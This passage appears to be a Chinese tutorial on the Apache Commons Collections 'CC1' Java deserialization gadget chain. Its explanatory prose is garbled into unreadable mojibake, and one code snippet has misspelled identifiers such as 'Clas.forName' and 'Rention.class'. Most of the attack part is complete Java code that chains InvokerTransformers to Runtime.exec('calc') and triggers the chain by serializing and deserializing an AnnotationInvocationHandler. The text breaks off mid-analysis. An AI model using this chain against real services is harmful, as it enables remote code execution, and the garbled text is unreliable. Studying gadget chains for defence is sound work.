org.apache.commons.collections.functors.ConstantTransformeræ˜¯è¿”å›ä¸€ä¸ªå›ºå®šå¸¸é‡çš„Transformerï¼Œåœ¨åˆå§‹åŒ–æ—¶å‚¨å­˜äº†ä¸€ä¸ªObjectï¼Œåç»­çš„è°ƒç”¨ä¼šç›´æ¥è¿”å›è¿™ä¸ªObjectã€‚å…³é”®æºç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 public ConstantTransformer(Object constantToReturn) { this.iConstant = constantToReturn; } public Object transform(Object input) { return this.iConstant; } è¿™ä¸ªç±»ç”¨äºå’ŒChainedTransformeré…åˆï¼Œå°†å…¶ç»“æœä¼ å…¥InvokerTransformeræ¥è°ƒç”¨æˆ‘ä»¬æŒ‡å®šçš„ç±»çš„æŒ‡å®šæ–¹æ³•ã€‚\næ”»å‡»æ„é€  CC1è¿™é‡Œæœ‰ä¸¤æ¡é“¾å¯ä»¥åˆ©ç”¨ï¼Œåˆ†åˆ«æ˜¯åˆ©ç”¨TransformedMapç±»å’ŒLazyMapç±»ï¼Œç°åœ¨æ¥åˆ†åˆ«è¯´æ˜ä¸€ä¸‹ã€‚\nTransformedMapé“¾ åŸºæœ¬æœ¬åœ°ä»£ç  è¿™é‡Œå°±ç»“åˆåˆ°å‰é¢çŸ¥è¯†ç‚¹ï¼Œæ¥æ„é€ ååºåˆ—åŒ–çš„æ¶æ„åˆ©ç”¨ä»£ç ã€‚ç°åœ¨æˆ‘ä»¬æ„é€ çš„æœ€ç»ˆçš„åˆ©ç”¨ç‚¹ï¼Œå°±æ˜¯Runtime.getRuntime().exec(\u0026quot;calc\u0026quot;)ï¼Œåœ¨è¿™é‡Œä½¿ç”¨TransformedMap è§¦å‘ï¼Œæœ¬åœ°demoå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package org.example; import org.apache.commons.collections.map.TransformedMap; import java.lang.Runtime; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; public class Test { public static void main(String[] args) { ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }); HashMap hashMap = new HashMap(); Map map2 = TransformedMap.decorate(hashMap,chain,null); map2.put(10,\u0026#34;xxx\u0026#34;); } } è¯´æ˜ä¸€ä¸‹è¿™ä¸²ä»£ç çš„ä½œç”¨ï¼Œå…ˆè¯´åé¢çš„åˆ©ç”¨ä»£ç ï¼š\n1 2 3 HashMap hashMap = new HashMap(); Map map2 = TransformedMap.decorate(hashMap,chain,null); map2.put(10,\u0026#34;xxx\u0026#34;); è¿™éƒ¨åˆ†ä»£ç åªè¦ç†è§£åˆ°äº†å‰é¢åœ¨TransformedMapç±»éƒ¨åˆ†ç»™çš„ç¤ºä¾‹ä»£ç åŸºæœ¬å°±å¯ä»¥ç†è§£äº†ã€‚æ‰€ä»¥é“¾å­èµ·å§‹ç‚¹å°±æ˜¯\nç°åœ¨æ¥çœ‹æµç¨‹ï¼Œæ‰“æ–­ç‚¹å¦‚ä¸‹ï¼š\nç„¶åå°±ç»§ç»­è·Ÿè¿›ï¼Œç”±äºæˆ‘ä»¬ä¼ å…¥çš„keyTransformerå°±æ˜¯ChainedTransformerç±»å¯¹è±¡ï¼Œæ‰€ä»¥è¿™é‡Œè°ƒç”¨çš„transform()æ–¹æ³•æ—¶ï¼Œè°ƒç”¨çš„å°±æ˜¯ChainedTransformerç±»çš„transform()æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š\nç°åœ¨æ¥çœ‹æˆ‘ä»¬ç»™ChainedTransformerç±»ä¼ å…¥çš„æ•°ç»„ï¼š\n1 2 3 4 5 6 ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }); //æ³¨æ„ç†è§£ 1.ç„¶åç°åœ¨å°±æ˜¯è°ƒç”¨çš„ä¼ å…¥çš„æ•°ç»„ç¬¬ä¸€ä¸ªå‚æ•°çš„transformæ–¹æ³•ï¼Œå³ConstantTransformerç±»çš„transform()æ–¹æ³•ï¼ˆæ­¤æ—¶çš„objectä¸º10ï¼‰ï¼š\nè¿™é‡Œçš„transformæ–¹æ³•ä¼šç›´æ¥è¿”å›æˆ‘ä»¬å®ä¾‹åŒ–æ—¶å®šä¹‰çš„Runtime.classï¼Œæ‰€ä»¥è¿™é‡Œçš„10æœ€ç»ˆæ˜¯æ²¡ç”¨çš„ï¼Œè¿™æ­¥è¿‡åobjectçš„å€¼å˜ä¸ºäº†Runtimeå¯¹è±¡ï¼Œå³class java.lang.Runtimeã€‚\n2.ç„¶åç°åœ¨è°ƒç”¨çš„å°±æ˜¯æ•°ç»„ç¬¬äºŒä¸ªå€¼çš„ç±»å®ä¾‹åŒ–å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯\n1 new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}) ç»§ç»­è·Ÿè¿›\næ³¨æ„çœ‹input.getClass()è¿™ä¸€æ­¥è¿‡åçš„clsçš„å€¼ï¼Œå±…ç„¶å˜æˆäº†Classå¯¹è±¡ï¼Œè¿™ä¹Ÿæ˜¯æœ€å¼€å§‹æ²¡æƒ³é€šçš„ï¼ˆè¿™é‡Œçš„Inputä¸æ˜¯ä¸€ä¸ªç±»çš„å®ä¾‹åŒ–å¯¹è±¡ï¼‰ï¼Œä¹Ÿå°±æ˜¯å¯¹ä»»ä½•ç±»çš„classå¯¹è±¡ä½¿ç”¨getClass()æ–¹æ³•æ—¶éƒ½ä¼šè¿”å›class java.lang.Classã€‚\nç„¶åè¿™é‡Œè°ƒç”¨getMethod()æ–¹æ³•è·å–Classå¯¹è±¡çš„getMethod()æ–¹æ³•å¹¶åœ¨returnçš„åœ°æ–¹ä½¿ç”¨invoke()æ–¹æ³•æ¥è·å–Runtimeç±»çš„getRuntime()æ–¹æ³•ï¼ˆgetRuntimeæ–¹æ³•ä¸ºé™æ€æ–¹æ³•ï¼‰\næ‰€ä»¥ç°åœ¨çš„objectå˜ä¸ºRuntimeé‡Œé¢çš„getRuntime()æ–¹æ³•ã€‚\n3.ç»§ç»­ï¼Œç°åœ¨åˆ°äº†ç¬¬ä¸‰ä¸ªå€¼çš„ç±»å®ä¾‹åŒ–å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯ï¼š\n1 new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}) è¿˜æ˜¯è¿›å…¥InvokerTransformerç±»çš„transformæ–¹æ³•\nè¿™é‡Œéœ€è¦æ³¨æ„çš„åŒæ ·çš„æ˜¯getClass()é‚£é‡Œï¼Œç”±äºæˆ‘ä¼ å…¥çš„æ˜¯ä¸€ä¸ªgetRuntime()æ–¹æ³•çš„classå¯¹è±¡ï¼Œæ‰€ä»¥è¿™é‡Œè¿”å›çš„æ˜¯class java.lang,reflect.Methodï¼Œç„¶åä½¿ç”¨åå°„è·å–Methodç±»ä¸­çš„invokeæ–¹æ³•ï¼Œæœ€åå†åœ¨returnéƒ¨åˆ†è°ƒç”¨invokeæ–¹æ³•æ¥åˆ©ç”¨åå°„è·å–çš„invoke()æ–¹æ³•ï¼Œå½¢å¦‚ï¼š\n1 2 3 4 Method f = Runtime.class.getMethod(\u0026#34;getRuntime\u0026#34;); Runtime r = (Runtime) f.invoke(null); r.exec(\u0026#34;calc\u0026#34;); //è¿™æ ·å°±å¯ä»¥ç›´æ¥æ‰§è¡Œæ–¹æ³•ä»è€Œè·å–Runtimeç±»çš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œè¿˜æ˜¯å’Œè¿™ä¸ªæ–¹æ³•æ˜¯staticæœ‰å…³ æ‰€ä»¥åœ¨è¿™é‡Œåº”è¯¥å°±æ˜¯ç›¸å½“äºç›´æ¥æ‰§è¡ŒgetRuntime()æ–¹æ³•ï¼ˆæ³¨æ„ç†è§£å¯¹æ¯”åå°„çš„çŸ¥è¯†ç‚¹ï¼Œè¿™é‡Œçš„çš„ç”¨æ³•éœ€è¦ç†è§£è®°å¿†ï¼‰\næ‰€ä»¥åœ¨è¿™ä¸€æ­¥åå¯ä»¥è·å–åˆ°new Runtimeçš„å®ä¾‹ã€‚\nå³ç°åœ¨çš„objectçš„å€¼ä¸ºRuntimeç±»çš„å®ä¾‹\n4.ç°åœ¨å°±åˆ°äº†æ•°ç»„çš„æœ€åä¸€ä¸ªå€¼ï¼Œå³ï¼š\n1 new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) ç„¶ååé¢å°±æ˜¯è·å–Runtimeç±»çš„execæ–¹æ³•ï¼Œå¹¶åœ¨invokeæ—¶ä¼ å…¥calcå¼¹å‡ºè®¡ç®—æœºã€‚\n5.æ€»ç»“\næœ€åç®€å•æ€»ç»“ä¸€ä¸‹chainé“¾ä¸­çš„æµç¨‹ï¼š\nä½¿ç”¨ConstantTransformerçš„transformæ–¹æ³•è¿”å›Runtime.class å†åœ¨InvokerTransformerçš„transformæ–¹æ³•è·å–getMethodæ–¹æ³•å¹¶åˆ©ç”¨è·å–getRuntime()æ–¹æ³• å†åœ¨InvokerTransformerçš„transformä¸­è·å–invokeæ–¹æ³•æ¥è°ƒç”¨getRuntime()æ–¹æ³•ä»è€Œè·å–åˆ°Runtimeç±»å®ä¾‹ã€‚ æœ€åè¿˜æ˜¯åœ¨InvokerTransformerçš„transformæ–¹æ³•è·å–åˆ°execæ–¹æ³•å¹¶ä¼ å…¥calcå¼¹å‡ºè®¡ç®—æœº åˆ†æç»“æŸã€‚\nå…¶å®è¿˜å¯ä»¥æ›´ç®€å•ï¼Œç»“åˆgetRuntime()æ–¹æ³•çš„ç‰¹æ€§ï¼Œå¯ä»¥å¦‚ä¸‹æ„é€ ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package org.example; import org.apache.commons.collections.map.TransformedMap; import java.lang.Runtime; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; class Test{ public static void main(String[] args){ ChainedTransformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.getRuntime()),new InvokerTransformer(\u0026#34;exec\u0026#34; , new Class[]{ String.class },new Object[]{\u0026#34;calc\u0026#34;}) }); HashMap hashMap = new HashMap(); Map ctf =TransformedMap.decorate(hashMap,chain,null); ctf.put(10,\u0026#34;xxx\u0026#34;); } } åŒæ ·æˆåŠŸå¼¹å‡ºè®¡ç®—æœº\nç»¼ä¸Šç¬¬äºŒç§çš„ç®€åŒ–ä»£ç æ›´ç®€æ´ï¼Œç¬¬ä¸€ç§åæŠ€å·§æ€§ï¼Œéƒ½è¦ç†è§£å­¦ä¹ åˆ©ç”¨ã€‚\nä½†æ˜¯ç¬¬äºŒç§ä»£ç æœ¬èº«åœ¨å…·ä½“çš„è¿ç”¨ä¸­å¹¶æ²¡æœ‰ç”¨ï¼Œè¿™æ˜¯å› ä¸ºRuntimeç±»å¹¶æ²¡æœ‰å®ç°Serializableæ¥å£ï¼Œè€Œè§£å†³æ–¹æ³•å°±æ˜¯ç¬¬ä¸€ç§ï¼Œæ‰€ä»¥åœ¨å®é™…è¿ç”¨ä¸­è¿˜æ˜¯ä½¿ç”¨çš„ç¬¬ä¸€ç§ã€‚\nå®é™…åˆ©ç”¨ ä¸Šé¢çš„ä»£ç åªæ˜¯ä¸€ä¸ªç”¨æ¥åœ¨æœ¬åœ°æµ‹è¯•çš„ç±»ï¼Œå¹¶ä¸”æ˜¯æˆ‘ä»¬é€šè¿‡æ„é€ ä»£ç æ¥å¯ç”¨ç¬¬ä¸€ä¸ªtransform()æ–¹æ³•ç»§è€Œå®ç°çš„é“¾å­ã€‚åœ¨å®é™…ååºåˆ—åŒ–æ¼æ´ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å®ƒçš„readObjectä»£ç é€»è¾‘ä¸­æœ‰ç±»ä¼¼Map.putæ–¹æ³•çš„æ“ä½œã€‚\nåœ¨è¿™é‡Œå¯ä»¥åˆ©ç”¨åˆ°çš„ç±»å°±æ˜¯sun.reflect.annotation.AnnotationInvocationHandlerã€‚\nç°åœ¨æ¥çœ‹è¿™ä¸ªç±»çš„readObject()æ–¹æ³•ï¼ˆéœ€è¦æ³¨æ„çš„æ˜¯è¿™æ˜¯8u71ä»¥å‰çš„ä»£ç ï¼Œ8u71ä»¥ååšäº†ä¸€äº›ä¿®æ”¹ï¼Œè¿™ä¸ªåé¢å†è¯´ï¼‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try { annotationType = AnnotationType.getInstance(type); } catch(IllegalArgumentException e) { // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(\u0026#34;Non-annotation type in annotation serial stream\u0026#34;); } Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet()) { String name = memberValue.getKey(); Class\u0026lt;?\u0026gt; memberType = memberTypes.get(name); if (memberType != null) { // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + \u0026#34;[\u0026#34; + value + \u0026#34;]\u0026#34;).setMember( annotationType.members().get(name))); } } } } é‡ç‚¹å…³æ³¨foreachè¯­å¥ã€‚åœ¨è¿™é‡ŒMap.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet()ç”¨äºéå†Mapï¼Œå¯ä»¥å‚è€ƒè¿™ä¸ªæ–‡ç« ï¼Œè€ŒString name = memberValue.getKey();è¯­å¥å’ŒObject value = memberValue.getValue();è¯­å¥ç”¨äºè·å–é”®å€¼å¯¹ã€‚\nè¿™é‡Œçš„é‡ç‚¹å°±æ˜¯è¿™ä¸ªsetValue()æ–¹æ³•äº†ï¼Œè¿™é‡Œç®€å•ç»™å‡ºè¿™ä¸ªè°ƒç”¨é“¾ï¼š\n1 AnnotationInvocationHandler#readObject() ==\u0026gt; AbstractInputCheckedMapDecorator$MapEntry#setValue() ==\u0026gt;TransformedMap#checkSetValue åœ¨TransformedMapè¿™é‡Œå°±å¯ä»¥å¯åŠ¨å‰é¢æ„é€ çš„è°ƒç”¨é“¾\nåŒæ—¶åœ¨è¿™é‡Œå¯ä»¥çœ‹å‡ºæ˜¯åˆ©ç”¨çš„valueTransformerï¼Œæ‰€ä»¥åœ¨è°ƒç”¨decorate()æ–¹æ³•åˆå§‹åŒ–æ—¶è¦ä¸åŒäºå‰é¢çš„åŸºæœ¬ä»£ç ï¼Œéœ€è¦æ”¹ä½ç½®ï¼Œå¦‚ä¸‹ï¼š\n1 Map map2 = TransformedMap.decorate(hashMap,null,chain); è¿™æ ·æ‰èƒ½ä¿è¯æˆåŠŸè°ƒç”¨ã€‚ç°åœ¨å°±å›´ç»•è¿™æ¡é“¾å­æ¥è¿›è¡Œé˜è¿°ã€‚\n1.ç°åœ¨æ¥çœ‹memberValuesçš„èµ‹å€¼ç‚¹ï¼š\nè¿™é‡Œç”±äºAnnotationInvacationHandlerå±jdkå†…éƒ¨ç±»ï¼Œæ— æ³•ç›´æ¥å¼•ç”¨ä¸”è¢«å®ä¾‹åŒ–ï¼Œæ‰€ä»¥åªèƒ½åˆ©ç”¨åå°„è·å–æ„é€ æ–¹æ³•ï¼Œå°†ä¿®é¥°è¿‡çš„Mapæ·»åŠ è¿›å»ã€‚\næ³¨æ„çœ‹AnnotationInvacationHandlerçš„æ„é€ æ–¹æ³•ï¼Œç®€å•è¯´æ˜ä¸€ä¸‹å‚æ•°é—®é¢˜ï¼š\nå¯¹äºç¬¬ä¸€ä¸ªå‚æ•°Class\u0026lt;? extends Annotation\u0026gt; typeï¼Œç®€å•è¯´æ˜ä¸€ä¸‹ï¼šå½¢å¦‚**\u0026lt;ï¼Ÿ extends Collection\u0026gt;** è¿™é‡Œ**ï¼Ÿä»£è¡¨ä¸€ä¸ªæœªçŸ¥çš„ç±»å‹ï¼Œä½†æ˜¯ï¼Œè¿™ä¸ªæœªçŸ¥çš„ç±»å‹å®é™…ä¸Šæ˜¯Collection**çš„ä¸€ä¸ªå­ç±»ï¼ŒCollectionæ˜¯è¿™ä¸ªé€šé…ç¬¦çš„ä¸Šé™ã€‚\nåŒæ—¶çœ‹è¿™ä¸ªæ„é€ æ–¹æ³•é‡Œé¢çš„ if è¯­å¥ä»£ç ï¼Œè¿™é‡Œåªè¦æ»¡è¶³ä»»ä½•ä¸€ä¸ªæ¡ä»¶å°±ä¼šè¿›å…¥åˆ°ifè¯­å¥ï¼Œå¯¼è‡´ä¸èƒ½æ­£å¸¸èµ‹å€¼ã€‚è¿™é‡Œé‡ç‚¹å…³æ³¨!type.isAnnotation()ä»£ç ï¼Œè¿™é‡Œçš„isAnnotation()å‡½æ•°å°±æ˜¯ç”¨æ¥åˆ¤æ–­Classå¯¹è±¡æ˜¯å¦æ˜¯è¡¨ç¤ºä¸€ä¸ªæ³¨è§£ç±»å‹ã€‚æ‰€ä»¥è¿™é‡Œéœ€è¦ä¸€ä¸ªä¼ å…¥ä¸€ä¸ªæ³¨è§£ç±»å‹çš„Annotationã€‚ä¹Ÿå°±æ˜¯ä¸‹å›¾ä¸­æœ‰@çš„ç±»ï¼š\né€‰æ‹©ä¸Šé¢çš„ä»»æ„ä¸€ä¸ªæ³¨è§£ç±»å‹çš„ç±»åº”è¯¥éƒ½æ˜¯å¯ä»¥çš„\næ‰€ä»¥å¯ä»¥æ„é€ ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 Class clazz = Clas.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDelaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); constructor1.newInstance(Rention.class,ctf); //ctfå³æ„é€ å¥½çš„TransformedMap ç°åœ¨è§£å†³äº†memberValueså€¼çš„é—®é¢˜ã€‚\n2.ç»§ç»­çœ‹readObject()æ–¹æ³•çš„æºç \nä¸ºäº†æ–¹ä¾¿å­¦ä¹ ï¼Œæˆ‘ä»¬å°è¯•ç›´æ¥æ‹¼æ¥ä¸€ä¸‹å‰é¢çš„æ€»ç»“å‡ºæ¥çš„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 package org.example; import org.apache.commons.collections.map.TransformedMap; import java.lang.Runtime; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.Class; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Test { public static void main(String[] args) throws Exception { ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }); HashMap hashMap = new HashMap(); Map map2 = TransformedMap.decorate(hashMap,null,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,map2); //åºåˆ—åŒ– serialize(o); //ååºåˆ—åŒ– unserialize(); } public static void serialize(Object o) throws Exception { ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); } public static void unserialize() throws Exception { ObjectInputStream o = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); o.readObject(); o.close(); } } å†æ‰“æ–­ç‚¹è°ƒè¯•å‘ç°æ˜¯åœ¨readObject()åœ°æ–¹å‡ºç°é—®é¢˜ï¼Œç°åœ¨æ¥è·Ÿä¸€ä¸‹readObject()çš„æºç ï¼Œæ‰“æ–­ç‚¹å¦‚ä¸‹ï¼š\nå…ˆæ¥çœ‹è¿™ä¸¤ä¸²ä»£ç ï¼š\n1 2 3 annotationType = AnnotationType.getInstance(type); å’Œ Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes = annotationType.memberTypes(); ç®€å•çœ‹çœ‹ç»“æœï¼š\nç¬¬ä¸€è¡Œä»£ç å°†annotationTypeè¢«èµ‹å€¼ä¸ºäº†AnnotationTypeå®ä¾‹ï¼Œæ‰€ä»¥ç¬¬äºŒè¡Œä»£ç å°±ä¼šè°ƒç”¨AnnotationTypeç±»çš„memberTypes()æ–¹æ³•:\næ‰€ä»¥æœ€ç»ˆreadObject()æ–¹æ³•é‡Œé¢çš„memberTypesä¸ºHashMapç±»çš„å®ä¾‹ã€‚\nè¿™é‡Œè¿˜è¦è¯´æ˜ä¸€ä¸ªç‚¹ï¼Œå…³äºfor (Map.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet())è¿™ä¸ªå¾ªç¯éå†çš„ä»£ç é—®é¢˜ï¼Œåœ¨æ‰“æ–­ç‚¹è¿‡ç¨‹ä¸­ï¼Œæˆ‘å‘ç°å¦‚ä¸‹æ‰“æ–­ç‚¹ä¼šç›´æ¥ç»“æŸï¼š\né‚£å°±è¯´æ˜åœ¨æˆ‘ä¸Šé¢æ‹¼æ¥çš„ä»£ç åœ¨ååºçš„æ—¶å€™å¹¶æ²¡æœ‰æˆåŠŸè¿›å…¥åˆ°è¿™ä¸ªforè¯­å¥ä¸­ï¼Œæˆ‘çŒœæµ‹æ˜¯è¿™ä¸ªå¾ªç¯éå†çš„é—®é¢˜ï¼Œå»æŸ¥çœ‹å‰é¢ç»™çš„æ–‡ç« çš„ä¸¾ä¾‹ä»£ç ï¼Œç›´æ¥çœ‹æµ‹è¯•ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import java.util.Map; import java.util.HashMap; public class reflect { public static void main(String[] args) throws Exception { Map\u0026lt;Integer, String\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(1, \u0026#34;value1\u0026#34;); map.put(2, \u0026#34;value2\u0026#34;); map.put(3, \u0026#34;value3\u0026#34;); map.put(4, \u0026#34;value4\u0026#34;); map.put(5, \u0026#34;value5\u0026#34;); for (Integer key : map.keySet()) { System.out.println(\u0026#34;key: \u0026#34; + key + \u0026#34; value: \u0026#34; + map.get(key)); } System.out.println(); for (Map.Entry\u0026lt;Integer, String\u0026gt; entry : map.entrySet()) { System.out.println(\u0026#34;æˆåŠŸè¿›å…¥å¾ªç¯éå†\u0026#34;); System.out.println(\u0026#34;key: \u0026#34; + entry.getKey() + \u0026#34; value: \u0026#34; + entry.getValue()); } } } æˆåŠŸè¾“å‡º\nä½†æ˜¯å½“æˆ‘ä½¿ç”¨å¦‚ä¸‹ä»£ç æµ‹è¯•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import java.util.Map; import java.util.HashMap; public class reflect { public static void main(String[] args) throws Exception { Map\u0026lt;Integer, String\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); for (Integer key : map.keySet()) { System.out.println(\u0026#34;key: \u0026#34; + key + \u0026#34; value: \u0026#34; + map.get(key)); } System.out.println(); for (Map.Entry\u0026lt;Integer, String\u0026gt; entry : map.entrySet()) { System.out.println(\u0026#34;æˆåŠŸè¿›å…¥å¾ªç¯éå†\u0026#34;); System.out.println(\u0026#34;key: \u0026#34; + entry.getKey() + \u0026#34; value: \u0026#34; + entry.getValue()); } } } å´ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œè¿™ä¸ªç»“æœé‚£å°±ç¡®å®è¯´æ˜äº†*æˆ‘ä»¬éœ€è¦å‘Mapä¸­é”®å…¥è‡³å°‘ä¸€å¯¹é”®å€¼å¯¹æ‰èƒ½æˆåŠŸè¿›å…¥åˆ°è¿™ä¸ªforå¾ªç¯ã€‚*åç»­æœ‰ä¸ªé—®é¢˜ï¼Œç›´æ¥è®²äº†ï¼š\nè¿™é‡Œçœ‹readObject()æºç ï¼Œå¯ä»¥çŸ¥é“éœ€è¦å°†è¿™ä¸ªå€¼è®¾ç½®ä¸ºStringé‚£ä¹ˆæµ‹è¯•ä»£ç å°±å¯ä»¥æ”¹æˆå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 package org.example; import org.apache.commons.collections.map.TransformedMap; import java.lang.Runtime; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.Class; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Test { public static void main(String[] args) throws Exception { ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;ceshi\u0026#34;,\u0026#34;value1\u0026#34;); Map map2 = TransformedMap.decorate(hashMap,null,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,map2); //åºåˆ—åŒ– serialize(o); //ååºåˆ—åŒ– unserialize(); } public static void serialize(Object o) throws Exception { ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); } public static void unserialize() throws Exception { ObjectInputStream o = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); o.readObject(); o.close(); } } å†è°ƒè¯•æˆåŠŸè¿›å…¥forå¾ªç¯ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼Œé‚£ä¹ˆç»§ç»­æ‰“æ–­ç‚¹ï¼Œå¦‚ä¸‹æ‰“æ–­ç‚¹æ—¶ä¼šç›´æ¥é€€å‡º\nè¯´æ˜å¹¶æ²¡æœ‰è¿›å…¥è¿™ä¸ªifæ¡ä»¶ï¼Œé‚£ä¹ˆç°åœ¨é‡ç‚¹å…³æ³¨memberTypeçš„èµ‹å€¼è¯­å¥ï¼š\nå†åœ¨ifè¯­å¥æ‰“ä¸€ä¸ªæ–­ç‚¹ï¼Œæ­¤æ—¶å€¼çš„æƒ…å†µä¸ºï¼š\né‚£ä¹ˆç°åœ¨çœ‹ä¸€ä¸‹è¿™ä¸ªè°ƒç”¨çš„getæ–¹æ³•ï¼Œå‰é¢å·²ç»è¯´è¿‡äº†memberTypesä¸ºHashMapç±»å®ä¾‹ï¼Œé‚£ç°åœ¨å°±çœ‹HashMapç±»çš„getæ–¹æ³•ï¼Œæºç å¦‚ä¸‹ï¼š\n1 2 3 4 public V get(Object key) { Node\u0026lt;K,V\u0026gt; e; return (e = getNode(hash(key), key)) == null ? null : e.value; } 